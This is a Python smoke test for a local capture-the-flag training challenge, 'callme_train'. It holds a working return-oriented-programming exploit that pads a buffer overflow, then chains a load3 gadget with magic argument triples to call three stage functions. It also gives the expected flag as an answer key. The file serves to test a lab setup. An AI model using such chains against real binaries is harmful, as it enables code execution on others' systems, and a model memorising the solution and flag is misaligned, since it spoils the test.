#!/usr/bin/env python3
"""Smoke test for callme_train (port 19993): chained foreign-function
calls with per-stage gating (three vault stages, each its own
0x51D1F0xx magic triple). MR6 training twin - the eval callme targets
stay unseen.

The protocol (one prompt, one write):
  1. pad: 16 filler bytes (measured: the return slot sits at +16).
  2. per stage (seal, turn, open): load3 gadget + the stage's own
     triple (three qwords) + the stage's address.
  3. the chain fires: seal: OK, turn: OK, open reads the flag.

The banner announces the addresses at runtime (no-PIE: fixed per
binary, leaked here anyway).

Success output:

  FLAG: FLAG{mr6_callme_train_3gates}
"""

import re
import socket
import struct
import sys

HOST = "127.0.0.1"
PORT = int(__import__("os").environ.get("SMOKE_PORT", 19993))

PAD = 16  # measured: the return slot sits at +16


def recv_until(s, needle, limit=8192, t=5.0):
    s.settimeout(t)
    data = b""
    while needle not in data and len(data) < limit:
        try:
            chunk = s.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
    return data


def main():
    try:
        s = socket.create_connection((HOST, PORT), timeout=10)
    except OSError as e:
        print(
            f"SKIP: port {PORT} not listening ({e}); "
            "the lab stack is not running - deploy it and re-run"
        )
        return 0

    banner = recv_until(s, b"sequence? ")
    text = banner.decode(errors="replace")
    print(f"[+] banner: {text.strip()[:120]}")

    def addr(name):
        m = re.search(rf"{name}\(\) at (0x[0-9a-f]+)", text)
        assert m, f"no {name}() leak in the banner: {text!r}"
        return int(m.group(1), 16)

    seal = addr("seal")
    turn = addr("turn")
    open_ = addr("open")
    load3 = addr("load3")
    print(f"[+] banner: seal={seal:#x} turn={turn:#x} open={open_:#x} load3={load3:#x}")

    # the chain: pad + [load3, triple, stage] x 3 (seal, turn, open)
    triples = [
        (0x51D1F001, 0x51D1F002, 0x51D1F003, seal),
        (0x51D1F004, 0x51D1F005, 0x51D1F006, turn),
        (0x51D1F007, 0x51D1F008, 0x51D1F009, open_),
    ]
    chain = b"A" * PAD
    for a, b, c, stage in triples:
        chain += struct.pack("<QQQQ", load3, a, b, c)
        chain += struct.pack("<Q", stage)
    chain += b"\n"
    s.send(chain)

    out = recv_until(s, b"FLAG:")
    try:
        out += s.recv(4096)
    except (socket.timeout, TimeoutError):
        pass  # the flag line was the last output; nothing follows it
    tail = out.strip()[-120:].decode(errors="replace")
    print(f"[+] output: {tail!r}")
    assert b"FLAG{mr6_callme_train_3gates}" in out, "oracle flag missing"
    print("[+] callme_train SMOKE TEST PASSED")
    return 0


if __name__ == "__main__":
    sys.exit(main())
